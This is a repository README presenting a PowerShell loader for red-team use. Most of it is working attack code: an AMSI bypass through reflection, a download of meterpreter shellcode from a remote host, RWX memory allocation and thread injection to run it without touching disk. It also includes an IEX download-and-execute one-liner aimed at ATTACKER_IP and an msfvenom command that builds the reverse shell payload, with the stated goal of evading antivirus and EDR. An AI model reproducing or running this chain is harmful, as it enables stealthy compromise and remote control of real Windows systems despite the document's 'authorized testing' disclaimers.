# amsi-bypass-inmemory-loader



# AMSI Bypass + In-Memory PowerShell Loader

This repository demonstrates a common technique used in red team operations and penetration testing to bypass **AMSI (Antimalware Scan Interface)** and execute shellcode directly in memory without touching the disk. This approach is particularly useful to evade static and runtime detections by antivirus and EDR solutions.

## 🔍 Overview

During a penetration testing engagement on a Windows 10 Pro (Build 19045) system, this PowerShell-based loader was used to download and inject a meterpreter reverse TCP shellcode (`mt.raw`) directly into the memory of the current process. The payload was executed without creating files on the filesystem, minimizing the forensic footprint and circumventing disk-based scanning.

## 🛠️ Script Logic

```powershell
[string1] = "System.Management.Automation.Amsi" + "Utils"
[string2] = "amsiInit" + "Failed"
[type]   = [Ref].Assembly.GetType($string1)
[field]  = $type.GetField($string2, [Reflection.BindingFlags]"NonPublic,Static")
$field.SetValue($null, $true)

$data = (New-Object Net.WebClient).DownloadData('http://192.168.1.13/mt.raw')
$size = $data.Length
$addr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($size)
[System.Runtime.InteropServices.Marshal]::Copy($data, 0, $addr, $size)

Add-Type -MemberDefinition @'
[DllImport("kernel32.dll")]
public static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
'@ -Name NativeMethods -Namespace Win32
[Win32.NativeMethods]::VirtualProtect($addr, [uint32]$size, 0x40, [ref][uint32]0)

$kernel32Type = Add-Type -MemberDefinition @'
[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(uint lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
[DllImport("kernel32.dll")]
public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
'@ -Name Kernel32Functions -Namespace Win32

$hThread = [Win32.Kernel32Functions]::CreateThread(0, 0, $addr, 0, 0, 0)
[Win32.Kernel32Functions]::WaitForSingleObject($hThread, 0xFFFFFFFF)

```

🔐 What This Script Does
Bypass AMSI by patching the field amsiInitFailed to true, disabling its runtime functionality.
Download a raw payload from a remote attacker-controlled web server (mt.raw).
Allocate memory using AllocHGlobal and copy the payload into it.
Set memory protection to PAGE_EXECUTE_READWRITE to allow payload execution.
Spawn a new thread pointing to the payload, enabling execution without disk writes.
⚠️ Security Notice
This technique is for authorized penetration testing only.
It is designed to avoid detection from static and runtime AV systems — use responsibly.
Never run unknown PowerShell scripts without full understanding of their consequences.
🧪 Example Usage
You can run the script from a Meterpreter session or standalone PowerShell prompt with appropriate permissions:

powershell

```

IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/loader.ps1')

```
Or locally:

powershell


```
.\loader.ps1
```

Ensure your payload (mt.raw) is prepared via msfvenom:

bash

```

msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.1.13 LPORT=4444 -f raw -o mt.raw

```

✅ Requirements
Windows PowerShell 5.1 or PowerShell Core 7+
.NET Framework and Reflection support
Internet access (if downloading the payload remotely)
License
All content in this repository is intended for educational and authorized security testing purposes only.

© HACKERAIPENTEST 2025 – All Rights Reserved



